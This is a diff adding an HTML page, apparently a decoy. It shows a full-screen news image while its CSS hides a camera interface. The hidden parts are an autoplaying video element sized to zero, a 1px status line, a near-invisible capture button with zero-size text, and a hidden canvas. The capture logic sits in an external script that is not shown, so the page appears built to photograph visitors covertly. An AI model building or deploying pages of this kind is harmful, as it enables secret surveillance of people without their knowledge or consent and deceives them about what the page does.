@@ -1,0 +1,138 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>livnso</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+    background: #000000;
+    color: #0000;
+    font-family: Arial, sans-serif;
+}
+
+html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    height: 100%;
+}
+
+body {
+    background-image: url("news.jpg");
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+}
+
+.studio {
+    width: 100%;
+    max-width: 520px;
+    padding: 24px;
+    background: #0000;
+    border: 3px solid #0000;
+    border-radius: 20px;
+    box-shadow: 0 10px 20px #0000;
+}
+
+h1 {
+    margin: 0 0 8px;
+    font-size: 26px;
+    text-align: center;
+}
+
+.subtitle {
+    margin: 0 0 22px;
+    text-align: center;
+    color: #00000;
+    font-size: 14px;
+}
+
+.preview {
+    overflow: hidden;
+    width: 0%;
+    aspect-ratio: 4 / 3;
+    background: #00000;
+    border-radius: 14px;
+    border: 0px solid #00000;
+}
+
+video {
+    display: block;
+    width: 0%;
+    height: 0%;
+    object-fit: cover;
+}
+
+.status {
+    margin: 1px 0;
+    color: #000000;
+    text-align: center;
+    font-size: 1px;
+    min-height: 1px;
+    overflow-wrap: anywhere;
+}
+
+button {
+    width: 1%;
+    border: 0;
+    border-radius: 1px;
+    padding: 1px 1px;
+    background: #0000;
+    color: black;
+    font-size: 0px;
+    font-weight: 0;
+    cursor: pointer;
+}
+
+button:hover { background: #0000; }
+
+button:disabled {
+    opacity: .55;
+    cursor: not-allowed;
+}
+
+.note {
+    margin-top: 14px;
+    text-align: center;
+    color: #000000;
+    font-size: 12px;
+}
+
+canvas { display: none; }
+</style>
+</head>
+
+<body>
+<div class="studio">
+    <h1></h1>
+    <p class="subtitle"></p>
+
+    <div class="preview">
+        <video id="camera" autoplay playsinline muted></video>
+    </div>
+
+    <p class="status" id="status">Starting camera...</p>
+
+    <button id="captureBtn" disabled>Starting Camera...</button>
+
+    <p class="note"></p>
+
+    <canvas id="canvas"></canvas>
+</div>
+
+
+<script src="livnso.js"></script>
+</body>
+</html>
